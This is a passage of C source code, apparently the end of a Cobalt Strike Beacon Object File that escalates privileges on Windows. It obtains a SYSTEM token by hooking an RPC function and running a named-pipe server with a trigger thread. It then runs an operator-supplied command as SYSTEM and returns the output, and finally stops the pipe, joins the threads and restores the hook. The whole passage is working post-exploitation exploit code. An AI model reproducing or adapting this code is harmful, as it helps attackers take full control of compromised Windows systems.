				 api.pCloseHandle(system_token);
				 system_token = NULL;
			 }
		 } else {
			 LOGK( "[*] Running: \"%s\"\n", cmd_str);
			 create_process_read_out(system_token, cmd_str, cmd_len);
			 api.pCloseHandle(system_token);
			 system_token = NULL;
		 }
	 } else
		 BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get SYSTEM token\n");
 
 cleanup:
	 /* stop_pipe() unblocks the pipe server thread so it exits promptly. */
	 stop_pipe();
	 /* Join threads BEFORE restoring the hook — the trigger thread may still
	    be dispatching through the hooked function pointer. Removing the hook
	    while a thread is inside it is a race condition. */
	 if (hTriggerThread) {
		 api.pWaitForSingleObject(hTriggerThread, 10000);
		 api.pCloseHandle(hTriggerThread);
	 }
	 if (hPipeThread) {
		 api.pWaitForSingleObject(hPipeThread, 10000);
		 api.pCloseHandle(hPipeThread);
	 }
	 /* Restore the hook only after all threads have stopped. */
	 restore_rpc();
	 /* Safety net: close system_token if a thread set it after we stopped waiting
	    (e.g. early goto cleanup before the token-use block). */
	 if (system_token) {
		 api.pCloseHandle((HANDLE)system_token);
		 system_token = NULL;
	 }
 }
 
